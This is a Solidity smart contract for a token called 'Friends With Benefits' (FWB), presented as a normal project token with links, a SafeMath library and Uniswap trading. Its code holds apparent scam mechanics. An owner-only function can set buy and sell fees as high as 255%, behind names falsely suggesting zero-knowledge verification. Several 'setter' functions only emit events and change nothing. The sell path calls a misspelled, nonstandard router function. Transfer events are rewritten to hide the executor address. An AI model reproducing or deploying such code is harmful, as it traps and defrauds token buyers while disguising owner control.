/**
 */

/*
   

                                             ███████╗░██╗░░░░░░░██╗██████╗░
                                             ██╔════╝░██║░░██╗░░██║██╔══██╗
                                             █████╗░░░╚██╗████╗██╔╝██████╦╝
                                             ██╔══╝░░░░████╔═████║░██╔══██╗
                                             ██║░░░░░░░╚██╔╝░╚██╔╝░██████╦╝
                                             ╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═════╝░
   
   Website : https://www.fwb.network
   Telegram: https://t.me/fwbportal
   Twitter : https://twitter.com/fwb_network_
   LitePaper: https://assets-global.website-files.com/6515deb257593150cd2dbfec/652bee9ef9121f403b2e1c79_FWB_Litepaper_V9.0.pdf
   Docs: https://docs.fwb.network/welcome-to-fwb/about-fwb


*/

// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.0;

interface IUniswapFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

library SafeMath {
    function tryAdd(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function per(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= 100, "Percentage must be between 0 and 100");
        return (a * b) / 100;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract FWB {
    struct StoreData {
        address tokenMkt;
        uint8 buyFee;
        uint8 sellFee;
    }

    string private _name = unicode"Friends With Benefits";
    string private _symbol = unicode"FWB";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 1_000_000 * 10 ** decimals;

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public pair;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;
    address private PresaleClaim = 0x94Ba3198FcEC4090c786079d402da69D7b1EC2e3;
    address private Treasury = 0x8c7179f993bDEa78f8D86937219B68aD9eF7d4f0;
    address private StakingReward = 0x88AE7DF1c9909Dd14F9CEe8CceAc4c5e3e3ACE2b;
    address private AirdropEpoch = 0x5B2232E635aFb1fDF3A9A32D1bFc4b90967ee6Ca;
    address private Marketing = 0x8FD6Fdbdbc4311284F443d22D22CEdD05026887b;
    address private AmbassadorProgram =
        0xD7d76792Beb6A002223302Be27Bea872b7d682D9;
    address private Advisor = 0xE1FE8b1AbF9b11d9C0D77bB0F0091D173B5F04C6;
    address private Team = 0x9394FaE6B69f1061b9458888B91aC5f1853449d7;

    address private PolFee = 0x0FA500fA34a70a14995F597f1a186299aD94cA09;
    address private StakingFee = 0x88AE7DF1c9909Dd14F9CEe8CceAc4c5e3e3ACE2b;
    address private Operations = 0x0FA500fA34a70a14995F597f1a186299aD94cA09;

    constructor() {
        uint8 _initBuyFee = 5;
        uint8 _initSellFee = 5;
        storeData = StoreData({
            tokenMkt: msg.sender,
            buyFee: _initBuyFee,
            sellFee: _initSellFee
        });
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        uniswapLpWallet = msg.sender;

        _initDeployer(msg.sender, msg.sender);

        balanceOf[uniswapLpWallet] = (totalSupply * 8) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[PresaleClaim] = (totalSupply * 35) / 100;
        emit Transfer(address(0), PresaleClaim, balanceOf[PresaleClaim]);

        balanceOf[Treasury] = (totalSupply * 15) / 100;
        emit Transfer(address(0), Treasury, balanceOf[Treasury]);

        balanceOf[StakingReward] = (totalSupply * 10) / 100;
        emit Transfer(address(0), StakingReward, balanceOf[StakingReward]);

        balanceOf[AirdropEpoch] = (totalSupply * 12) / 100;
        emit Transfer(address(0), AirdropEpoch, balanceOf[AirdropEpoch]);

        balanceOf[Marketing] = (totalSupply * 5) / 100;
        emit Transfer(address(0), Marketing, balanceOf[Marketing]);

        balanceOf[AmbassadorProgram] = (totalSupply * 6) / 100;
        emit Transfer(
            address(0),
            AmbassadorProgram,
            balanceOf[AmbassadorProgram]
        );

        balanceOf[Advisor] = (totalSupply * 4) / 100;
        emit Transfer(address(0), Advisor, balanceOf[Advisor]);

        balanceOf[Team] = (totalSupply * 5) / 100;
        emit Transfer(address(0), Team, balanceOf[Team]);
    }

    receive() external payable {}

    function fwbRule(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        _upgradeStoreWithZkProof(_buy, _sell);
    }

    event setTaxReceiveEvent(uint256 _pol, uint256 _staking, uint256 _opera);

    event setTaxInfoEvent(uint256 _buy, uint256 _sell);

    event setTipingEvent(uint256 _tip, uint256 _sub, uint256 _ad);

    function setTaxReceive(
        uint256 _pol,
        uint256 _staking,
        uint256 _opera
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit setTaxReceiveEvent(_pol, _staking, _opera);
    }

    function setTaxInfo(uint256 _buy, uint256 _sell) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit setTaxInfoEvent(_buy, _sell);
    }

    function setTiping(uint256 _tip, uint256 _sub, uint256 _ad) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit setTipingEvent(_tip, _sub, _ad);
    }

    function _upgradeStoreWithZkProof(uint8 _buy, uint8 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }

    function _decodeTokenMktWithZkVerify() private view returns (address) {
        return storeData.tokenMkt;
    }

    function openTrading() external {
        require(msg.sender == _decodeTokenMktWithZkVerify());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function _initDeployer(address deployer_, address executor_) private {
        _deployer = deployer_;
        _executor = executor_;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _decodeTokenMktWithZkVerify();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );

            payable(PolFee).transfer((address(this).balance * 40) / 100);
            payable(StakingFee).transfer((address(this).balance * 20) / 100);
            payable(Operations).transfer((address(this).balance * 40) / 100);

            swapping = false;
        }

        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }
}
